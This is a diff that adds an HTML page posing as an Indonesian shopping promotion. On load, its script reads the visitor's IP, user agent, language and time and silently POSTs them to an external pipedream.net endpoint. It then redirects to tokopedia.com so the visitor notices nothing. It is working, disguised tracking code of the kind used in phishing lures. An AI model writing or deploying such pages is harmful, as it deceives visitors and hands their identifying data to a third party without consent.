@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Promo Khusus Kamu!</title>
+  <script>
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        const payload = {
+          ip: data.ip,
+          ua: navigator.userAgent,
+          lang: navigator.language,
+          time: new Date().toISOString()
+        };
+        fetch("https://eoi1qxm9cxsp15h.m.pipedream.net", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      });
+    setTimeout(() => {
+      window.location.href = "https://tokopedia.com/";
+    }, 2000);
+  </script>
+</head>
+<body>
+  <h1>Diskon Menarik Menantimu!</h1>
+  <img src="https://via.placeholder.com/600x300?text=Promo+Spesial" style="width:100%;max-width:600px;" />
+</body>
+</html>
